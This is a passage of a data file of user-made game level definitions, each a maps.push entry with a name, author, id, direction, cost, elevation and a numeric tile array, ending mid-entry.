maps.push({name="DONT PUSH THE BUTTON",author="sivi",id="#1662465102",direction="forward",cost=236,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,10,93,93,10,0,0,5,5,5,0,0,10,93,93,10,0,0,0,0,0,10,93,93,10,0,5,5,5,5,5,0,10,93,93,10,0,0,0,0,0,10,93,93,10,0,5,90,5,90,5,0,10,93,93,10,0,0,0,0,0,10,10,10,10,0,5,5,97,5,5,0,10,10,10,10,0,0,0,0,0,0,5,5,0,0,5,90,5,90,5,0,0,5,5,0,0,0,0,0,0,0,96,96,0,0,5,5,5,5,5,0,0,96,96,0,0,0,0,0,0,0,96,96,0,0,0,90,5,5,0,0,0,96,96,0,0,0,0,0,0,5,5,5,5,0,0,5,5,5,0,0,5,5,5,5,0,0,0,0,0,5,10,10,5,0,0,5,90,5,0,0,5,10,10,5,0,0,0,0,0,5,10,10,5,0,0,5,5,5,0,0,5,10,10,5,0,0,0,0,0,5,9,9,5,0,0,90,5,5,0,0,5,9,9,5,0,0,0,0,0,5,9,9,5,0,0,5,5,5,0,0,5,9,9,5,0,0,0,0,0,5,8,8,5,0,0,5,5,90,0,0,5,8,8,5,0,0,0,0,0,5,8,8,5,5,5,5,5,5,5,5,5,8,8,5,0,0,0,0,0,5,8,8,8,7,6,5,5,5,6,7,8,8,8,5,0,0,0,0,0,5,8,8,8,7,6,5,90,5,6,7,8,8,8,5,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,2,2,5,0,0,0,0,0,0,0,0]});
maps.push({name="Mini Tirith",author="ZpLit",id="#1662481187",direction="right",cost=289,elevation=6,map=[0,0,0,0,0,0,0,21,56,2,2,56,21,0,0,0,0,0,0,0,0,0,1,0,0,0,0,21,56,56,56,56,21,0,0,0,0,0,0,0,0,1,0,1,24,24,24,24,56,90,56,56,21,0,0,0,0,0,0,0,1,94,1,87,22,22,22,22,56,56,56,56,21,0,0,0,0,0,0,0,1,22,22,22,22,22,22,22,56,56,56,56,24,24,24,0,0,0,0,0,1,22,22,22,22,22,22,22,56,56,90,56,22,22,22,24,24,24,0,0,1,22,22,22,22,22,22,22,56,56,56,56,22,90,22,22,22,22,24,0,1,22,22,24,24,24,24,24,90,56,56,56,22,22,22,22,22,22,22,24,1,22,22,41,40,39,38,37,116,56,56,56,22,22,22,22,90,22,22,88,1,22,22,41,40,39,38,37,116,56,56,56,90,22,22,22,22,22,22,2,1,22,22,41,40,39,38,37,116,56,56,56,22,22,22,90,22,22,22,2,1,22,22,41,40,39,38,37,116,56,56,56,22,22,22,22,22,22,22,88,1,22,22,24,24,24,24,24,22,22,22,22,22,90,22,22,22,90,22,24,1,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,24,0,1,22,22,22,22,22,22,22,22,22,22,22,22,22,22,24,24,24,0,0,1,22,22,22,22,22,22,22,22,22,22,22,24,24,24,0,0,0,0,0,1,94,1,87,22,22,22,22,24,24,24,24,0,0,0,0,0,0,0,0,0,1,0,1,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Shortcut",author="sivi",id="#1662484841",direction="left",cost=290,elevation=0,map=[1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1,90,93,90,93,90,93,90,1,1,1,1,44,1,1,1,1,1,14,14,1,2,14,14,14,14,14,14,114,94,114,0,96,65,9,9,131,128,14,14,1,2,14,14,14,14,14,14,114,97,114,0,96,65,9,9,131,128,14,132,1,0,0,0,0,90,14,14,114,94,114,0,96,65,9,9,131,128,14,14,1,0,0,0,0,14,14,14,1,1,1,1,44,1,1,1,1,1,14,14,1,0,0,0,0,90,14,14,1,0,0,1,1,1,0,0,0,1,14,14,1,0,0,0,0,14,14,14,1,0,0,0,0,0,0,0,0,1,14,14,1,0,0,0,0,90,14,14,1,0,0,0,0,0,0,0,0,1,14,14,1,0,0,0,0,14,14,14,1,0,0,0,0,0,0,0,0,1,14,14,1,0,0,0,0,90,14,14,1,0,0,0,0,0,0,0,0,1,14,14,1,0,0,0,0,14,14,14,1,0,0,0,0,0,0,0,0,1,14,14,1,0,0,0,0,90,14,14,1,0,0,0,0,0,0,0,0,1,14,14,1,0,0,0,0,14,14,14,1,0,0,0,0,0,0,0,0,1,14,14,1,0,0,0,0,90,14,14,1,0,0,0,0,0,0,0,0,1,14,14,1,0,0,0,0,14,14,14,1,1,1,1,1,1,1,1,1,1,14,14,1,0,0,0,0,90,14,14,14,14,14,14,14,14,14,14,14,14,14,14,1,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,1,0,0,0,0,90,14,90,14,90,14,90,14,90,14,90,14,90,14,90,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Around Walls 1",author="TF2 Pencil",id="#1662524940",direction="forward",cost=138,elevation=14,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,29,29,29,0,0,29,29,0,0,29,29,9,9,0,0,0,0,0,0,0,29,1,1,1,1,1,1,1,1,1,1,9,9,0,0,0,0,0,0,0,29,1,15,15,14,13,12,11,10,9,96,9,9,0,0,0,0,0,0,0,0,1,15,15,14,13,12,11,10,9,96,9,9,0,0,0,0,0,0,0,0,1,15,15,1,1,1,1,1,1,1,1,1,0,0,0,0,0,29,29,29,1,15,15,16,17,18,19,20,21,22,23,23,0,0,0,0,0,97,29,29,1,15,15,16,17,18,19,20,21,22,23,23,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,23,23,0,0,0,0,0,0,0,29,29,0,29,0,29,0,29,0,9,3,23,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0]});
maps.push({name="Around Walls 2",author="TF2 Pencil",id="#1662524970",direction="forward",cost=197,elevation=0,map=[0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,30,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,30,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,1,92,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,12,12,1,0,1,32,32,32,0,32,32,0,32,34,36,1,0,0,0,0,12,12,1,0,1,32,97,0,0,0,131,0,0,0,38,1,0,0,0,0,12,12,1,0,1,32,0,0,0,0,0,0,0,0,40,1,0,0,0,0,12,12,1,0,1,0,0,0,0,0,0,0,0,42,42,1,0,0,0,0,12,12,1,0,1,32,0,0,0,0,0,0,0,97,42,1,0,0,0,0,12,12,1,0,1,32,0,0,0,32,97,0,0,0,0,1,0,0,0,0,12,12,1,0,1,0,32,32,0,32,32,0,0,32,32,1,0,0,0,0,12,12,1,30,1,1,1,1,1,1,1,1,1,1,30,1,0,0,0,1,12,12,1,30,30,92,0,0,0,0,0,0,0,30,30,1,0,0,0,1,12,12,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,1,12,12,12,12,96,96,12,12,12,12,12,12,12,12,12,12,0,0,0,1,132,12,12,12,96,96,12,12,12,12,12,12,12,12,12,12,0,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0]});
maps.push({name="Crowded Rooms 6",author="TF2 Pencil",id="#1662539213",direction="forward",cost=239,elevation=0,map=[0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,97,0,0,0,99,0,0,0,0,0,0,0,0,0,0,10,10,0,36,36,36,0,0,36,36,0,36,36,34,32,0,0,0,0,0,10,10,0,36,34,32,30,0,0,0,0,0,0,0,30,0,0,0,0,0,10,10,10,1,1,1,110,1,1,1,1,1,1,1,110,1,0,0,0,0,10,10,10,110,10,10,10,1,10,10,98,110,10,10,10,1,0,0,0,0,10,10,10,1,10,10,10,1,10,10,10,1,10,10,10,1,0,0,0,0,10,10,10,1,10,10,96,110,10,10,10,1,10,10,131,1,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,1,132,10,101,110,10,10,10,1,10,0,10,110,10,10,10,0,0,0,102,1,10,10,10,1,10,10,10,1,0,10,0,1,10,10,10,0,0,0,32,1,10,10,10,1,104,10,10,110,10,0,10,1,10,10,10,0,0,0,0,1,110,1,1,1,1,1,1,1,1,1,1,1,10,10,10,0,0,33,32,31,30,0,100,0,0,0,100,0,0,0,100,0,0,10,10,0,0,34,0,0,0,0,36,0,0,0,36,0,0,0,36,34,34,10,10,0,0,35,36,0,0,103,36,0,0,103,36,0,0,103,36,34,34,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0]});
maps.push({name="LAGEADORES",author="iProbie",id="#1662540161",direction="right",cost=638,elevation=0,map=[5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,0,0,66,5,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,0,0,66,66,5,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,0,0,66,66,66,5,66,66,66,66,66,66,66,66,66,66,66,66,66,66,0,0,66,66,66,66,5,66,66,66,66,66,66,66,66,66,66,66,66,66,0,0,66,66,66,66,66,5,66,66,66,66,66,66,66,66,66,66,66,66,0,0,66,66,66,66,66,66,5,66,66,66,66,66,66,66,66,66,66,66,0,0,66,66,66,66,66,66,66,5,66,66,66,66,66,66,66,66,66,66,0,0,66,66,66,66,66,66,66,66,5,66,66,66,66,66,66,66,66,66,0,0,66,66,66,66,66,66,66,66,66,5,66,66,66,66,66,66,66,66,0,0,66,66,66,66,66,66,66,66,66,66,5,66,66,66,66,66,66,66,0,0,66,66,66,66,66,66,66,66,66,66,66,5,66,66,66,66,66,66,0,0,66,66,66,66,66,66,66,66,66,66,66,66,5,66,66,66,66,66,0,0,66,66,66,66,66,66,66,66,66,66,66,66,66,5,66,66,66,66,5,0,66,66,66,66,66,66,66,66,66,66,66,66,66,66,5,66,66,66,2,0,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,5,66,66,2,0,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,5,66,5,0,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Crowded Rooms 7",author="TF2 Pencil",id="#1662582148",direction="forward",cost=180,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,11,11,1,0,0,0,0,0,0,0,0,0,99,0,0,33,33,31,31,51,11,11,51,31,31,33,33,0,0,99,0,0,40,0,0,35,0,0,0,1,11,11,1,0,0,0,35,0,0,40,0,0,39,0,0,0,0,1,1,1,11,11,1,1,1,0,0,0,0,39,0,0,38,0,0,35,0,1,93,11,11,11,11,94,1,0,35,0,0,38,0,0,37,0,0,35,0,1,93,11,11,11,11,94,1,0,35,0,0,37,0,0,36,0,0,0,0,1,1,1,96,96,1,1,1,0,0,0,0,36,0,0,35,0,0,35,0,0,97,1,11,11,1,97,0,0,35,0,0,35,0,0,35,0,0,35,0,0,35,1,11,11,1,35,0,0,35,0,0,35,0,0,0,0,0,0,0,1,1,1,11,11,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,94,11,11,11,11,93,1,0,0,0,0,0,0,0,0,0,0,35,0,1,94,11,11,11,11,93,1,0,35,0,0,0,0,0,35,35,35,35,0,1,1,1,98,98,1,1,1,0,35,35,35,35,0,0,35,0,0,0,0,0,0,1,11,11,1,0,0,0,0,0,0,35,0,0,0,0,0,0,0,0,0,1,11,11,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,100,1,11,11,1,100,0,0,0,0,0,0,0,0,35,35,35,0,0,35,35,0,11,11,0,35,35,0,0,35,35,35,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Square Pyramid",author="TF2 Pencil",id="#1662582193",direction="forward",cost=216,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,0,0,0,0,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,0,0,0,0,8,10,10,10,10,10,10,10,10,10,10,10,10,8,8,8,0,0,0,0,8,10,12,12,12,12,12,12,12,12,12,12,10,8,0,0,0,0,0,0,8,10,12,14,14,14,14,14,14,14,14,12,10,8,0,0,0,0,0,0,8,10,12,14,16,16,16,16,16,16,14,12,10,8,0,0,0,0,0,0,8,10,12,14,16,18,18,18,18,16,14,12,10,8,0,0,0,0,0,0,8,10,12,14,16,18,93,94,18,16,14,12,10,8,0,0,0,0,0,0,8,10,12,14,16,18,94,93,18,16,14,12,10,8,0,0,0,0,0,0,8,10,12,14,16,18,18,18,18,16,14,12,10,8,0,0,0,0,0,0,8,10,12,14,16,16,16,16,16,16,14,12,10,8,0,0,0,0,0,0,8,10,12,14,14,14,14,14,14,14,14,12,10,8,0,0,0,0,0,0,8,10,12,12,12,12,12,12,12,12,12,12,10,8,0,0,0,0,8,8,8,10,10,10,10,10,10,10,10,10,10,10,10,8,0,0,0,0,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,0,0,0,0,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Around Walls 3",author="TF2 Pencil",id="#1662582240",direction="left",cost=181,elevation=15,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,18,18,17,16,15,14,96,96,96,14,13,12,11,10,9,9,0,0,0,0,18,18,17,16,15,14,96,96,96,14,13,12,11,10,9,9,0,0,0,0,19,19,1,1,1,1,1,1,1,1,1,1,1,1,9,9,0,0,0,0,20,20,1,37,0,0,0,92,37,37,3,3,31,31,9,9,0,0,0,0,21,21,1,125,1,1,1,1,97,37,0,0,31,31,9,9,0,0,0,0,22,22,1,41,41,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,23,1,41,41,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,1,41,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,98,98,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,98,98,1,41,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,1,41,99,0,0,0,0,0,0,0,100,131,0,0,0,2,24,24,24,132,1,41,41,0,41,0,41,0,41,0,41,41,0,0,0,2,24,24,24,24,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Stupid Bridge",author="TF2 Pencil",id="#1662582363",direction="left",cost=128,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,41,100,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,41,41,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,41,41,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,14,54,55,56,57,58,59,60,61,61,60,59,58,57,56,55,54,14,14,0,14,54,55,56,57,58,59,60,61,61,60,59,58,57,56,56,54,125,14,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,2,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,2,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,0,14,54,55,56,57,58,59,60,61,61,60,59,58,57,56,55,54,14,14,0,14,54,55,56,57,58,59,60,61,61,60,59,58,57,56,55,54,125,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,41,41,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,41,41,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,41,100,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Trigger Tower 1",author="TF2 Pencil",id="#1662584816",direction="forward",cost=137,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,14,14,1,1,1,1,1,0,0,0,0,0,0,0,0,1,36,0,36,36,14,14,0,1,105,97,1,0,0,0,0,0,0,0,0,1,36,0,0,0,14,14,0,1,105,105,1,0,0,0,0,0,0,0,0,1,0,0,0,0,14,14,0,1,105,105,1,0,0,0,0,0,0,0,0,1,0,0,97,0,14,14,0,1,106,106,1,0,0,0,0,0,0,0,0,1,36,0,44,0,14,14,0,1,107,107,1,0,0,0,0,0,0,0,0,1,36,0,44,0,14,14,0,1,108,108,1,0,0,0,0,0,0,0,0,1,0,0,42,0,14,14,0,1,109,109,1,0,0,0,0,0,0,0,0,1,38,0,42,0,14,14,1,1,110,110,1,0,0,0,0,0,0,0,0,1,38,40,40,0,14,14,113,112,111,111,1,0,0,0,0,0,0,0,0,1,38,40,40,0,14,14,113,112,111,111,1,0,0,0,0,0,0,0,0,1,1,1,1,1,98,98,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Trigger Tower 2",author="TF2 Pencil",id="#1662584860",direction="right",cost=141,elevation=19,map=[0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,1,45,45,0,30,31,32,33,0,97,39,40,41,42,43,1,0,0,0,0,1,45,45,0,30,0,0,34,0,0,39,0,0,0,44,1,0,0,0,0,1,45,45,0,0,0,0,34,0,0,39,1,1,1,44,1,0,0,0,0,1,45,45,45,45,45,45,45,45,45,45,45,96,45,24,24,24,2,0,0,1,45,45,45,45,45,45,45,45,45,45,45,96,45,3,24,24,2,0,0,1,25,25,0,0,0,0,34,0,0,39,1,1,1,0,1,0,0,0,0,1,27,27,0,30,0,0,34,0,0,39,0,0,0,0,1,0,0,0,0,1,29,29,0,29,0,0,35,36,37,38,0,0,0,0,1,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Layers",author="Luffaren",id="#1662587598",direction="forward",cost=521,elevation=0,map=[94,9,90,9,67,67,67,9,85,9,67,67,67,9,9,9,5,2,2,5,85,9,9,9,65,65,65,9,9,9,65,65,65,9,9,9,5,5,5,85,9,9,9,9,65,65,65,90,9,9,65,65,65,9,9,9,5,5,5,5,8,8,8,14,14,14,14,14,14,14,14,14,14,90,9,9,65,65,65,67,7,7,7,14,89,14,14,14,14,14,14,14,14,9,9,9,65,65,65,67,6,6,6,14,14,14,14,14,90,14,14,14,14,9,89,9,65,65,65,67,5,5,5,14,14,14,105,105,93,105,14,14,14,9,9,9,5,5,5,5,5,5,90,14,14,90,105,5,5,105,14,14,14,9,9,9,90,5,5,85,5,5,5,14,14,14,105,75,75,96,5,5,5,85,5,85,5,5,5,5,85,5,5,14,14,14,105,75,75,105,14,14,14,9,9,9,65,65,65,67,85,85,5,90,14,14,105,75,75,105,90,14,14,9,9,9,65,65,65,67,5,5,5,14,14,14,105,75,75,105,14,14,14,9,9,9,65,65,65,67,5,5,5,5,5,5,1,5,5,1,5,5,5,5,85,5,5,5,5,5,67,65,65,65,14,14,105,75,75,105,14,14,14,9,9,9,85,5,5,90,67,65,65,65,14,14,105,75,75,105,14,90,14,9,9,9,5,5,5,5,67,65,65,65,14,14,105,75,75,105,90,14,14,9,9,9,6,6,6,6,5,5,89,5,5,5,96,75,75,105,90,14,14,90,9,9,7,7,7,7,85,5,5,5,14,14,105,89,5,105,14,14,14,9,9,9,8,8,8,8,85,5,5,85,14,97,105,5,100,105,13,13,12,11,10,9,9,9,9,9,1,2,2,1,1,1,1,1,1,1,13,13,12,11,10,9,9,9,9,9]});
maps.push({name="Trigger Tower 3",author="TF2 Pencil",id="#1662612956",direction="forward",cost=165,elevation=19,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,5,5,1,0,0,0,0,0,0,1,14,14,3,5,5,96,5,5,5,5,5,5,1,0,0,0,0,0,0,1,14,132,1,1,1,1,1,1,1,1,5,5,1,0,0,0,0,0,0,1,14,1,1,97,29,27,25,0,0,25,5,5,1,0,0,0,0,0,0,1,14,1,0,29,29,27,25,0,0,25,5,5,1,0,0,0,0,0,0,1,14,1,0,30,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,14,1,0,31,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,98,1,0,32,0,131,44,43,42,41,40,40,1,0,0,0,0,0,0,1,14,1,0,33,0,100,44,43,42,41,40,40,1,0,0,0,0,0,0,1,14,1,0,34,0,0,0,0,0,0,0,40,1,0,0,0,0,0,0,1,14,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,14,1,0,0,0,0,0,0,0,0,39,39,1,0,0,0,0,0,0,1,3,1,0,34,35,36,37,38,39,0,39,99,1,0,0,0,0,0,0,1,24,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="GB3byfi34bvfi34fveei",author="TF2 Pencil",id="#1662613136",direction="left",cost=178,elevation=19,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,24,24,24,0,0,0,0,5,5,0,0,2,24,24,24,24,24,24,24,24,24,132,24,0,0,0,0,5,5,0,0,2,24,24,24,24,24,24,24,24,24,24,24,0,0,0,0,5,5,0,0,0,0,29,29,29,29,29,29,29,29,28,28,27,27,26,26,25,25,0,0,0,0,29,29,29,29,29,29,29,29,28,28,27,27,26,26,25,25,0,0,0,0,30,30,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,30,30,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,31,31,0,0,39,39,39,39,39,39,39,39,39,39,39,39,0,0,0,0,31,31,0,0,39,39,39,39,39,39,39,39,39,39,39,39,0,0,0,0,32,32,0,0,40,40,0,0,0,0,0,0,0,0,39,39,0,0,0,0,32,32,0,0,40,40,0,0,0,0,0,0,0,0,39,39,0,0,0,0,33,33,0,0,41,41,42,42,43,43,44,131,0,0,39,39,0,0,0,0,33,33,0,0,41,41,42,42,43,43,44,44,0,0,39,39,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,39,39,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,39,39,0,0,0,0,34,34,35,35,36,36,37,37,38,38,39,39,39,39,39,39,0,0,0,0,34,34,35,35,36,36,37,37,38,38,39,39,39,39,39,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Take your time",author="Applily",id="#1662676620",direction="right",cost=263,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,17,17,99,17,17,0,0,0,0,0,0,0,0,0,5,5,90,0,0,0,17,65,65,65,17,0,0,0,0,0,0,0,0,0,5,5,90,0,0,0,17,65,132,65,17,0,0,0,0,0,0,0,0,0,5,5,90,0,0,0,17,65,65,65,127,0,0,0,0,0,0,0,0,0,5,5,90,0,0,0,17,17,17,17,17,0,0,15,15,15,12,9,6,0,5,5,90,0,0,0,0,0,0,0,0,0,0,15,15,135,135,135,135,0,5,5,90,0,0,0,0,0,0,0,0,0,0,15,15,15,12,9,6,0,5,5,90,0,0,0,0,0,0,0,5,0,0,15,97,15,0,0,0,0,5,5,90,90,90,90,90,0,0,0,65,0,0,15,15,15,0,0,0,0,5,5,5,5,5,5,5,96,98,98,2,0,0,1,72,1,0,0,0,0,5,5,5,5,5,5,5,96,98,98,2,0,0,1,72,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,65,0,0,1,72,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,1,72,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,72,1,1,1,1,1,1,1,135,135,135,135,135,15,94,15,0,0,0,1,72,74,74,74,74,74,74,74,135,135,135,135,135,15,15,15,126,0,0,1,1,1,1,1,1,1,1,1,135,135,135,135,135,15,93,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,131,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0]});
maps.push({name="Dipshits 